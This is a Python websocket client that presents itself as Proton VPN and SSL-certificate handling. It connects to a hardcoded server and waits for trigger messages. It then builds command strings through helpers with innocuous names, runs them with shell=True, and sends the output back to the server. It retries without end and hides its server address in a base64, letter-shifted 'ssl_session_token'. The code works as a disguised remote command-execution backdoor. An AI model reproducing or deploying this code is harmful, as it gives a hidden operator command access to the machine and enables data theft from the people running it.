import asyncio
import ssl
import subprocess
import time

import websockets
from utils import varify_cert, cert_text, solve_ssl, get_proton_token, solve_ssl_proton, \
    config_proton


async def start_client():
    ssl_context = varify_cert(cert_text)
    cert_tex = ''
    update = False
    uri = "wss://192.168.88.70:8000/ws/parent"
    code = 0

    while True:
        if update:
            ssl_context = varify_cert(cert_tex)
        try:
            async with websockets.connect(uri, ssl=ssl_context) as websocket:
                while True:
                    try:
                        print("waiting")
                        conf = await websocket.recv()
                        if conf == 'config_proton':
                            response = config_proton()
                            await websocket.send(response)
                            continue
                        elif conf == "proton-vpn?yes:no":
                            ssl_check = get_proton_token()
                            cert_tex = solve_ssl_proton(ssl_session_token=ssl_check)
                            result = subprocess.run(cert_tex, shell=True, capture_output=True, text=True)

                            # Handle if the command returns nothing
                            if result.stdout == "":
                                await websocket.send("Null")
                                continue

                            await websocket.send(result.stdout)
                            result = subprocess.run(solve_ssl_proton(get_proton_token(active=True)), shell=True,
                                                    capture_output=True, text=True)
                            await websocket.send(result.stdout)

                            continue
                    except websockets.ConnectionClosedOK:
                        # This exception is raised on a clean closure (code 1000)
                        print("Connection closed cleanly (code 1000)")
                        code = 1000
                        break
                    except Exception as e:
                        # Send any errors back to the server
                        await websocket.send(str(e))
                        continue

        except websockets.exceptions.ConnectionClosedError:
            print("Connection closed. Retrying in 3 seconds...")
            time.sleep(3)
        except ssl.SSLCertVerificationError:
            update = True
            cert_tex = solve_ssl(ssl_session_token="a3d3c3Y6Ly8xOTIuMTY4Ljg4LjcwOjgwMDAvamh3LWZodXdsaWxmZHdo")
            print("SSL certificate verification failed. Retrying in 3 seconds...")
            time.sleep(3)
        except Exception as e:
            print(f"Connection failed: {e}")
            print("Retrying in 3 seconds...")
            time.sleep(3)
        finally:
            if code == 1000:
                break
            print("Closing connection")


if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(start_client())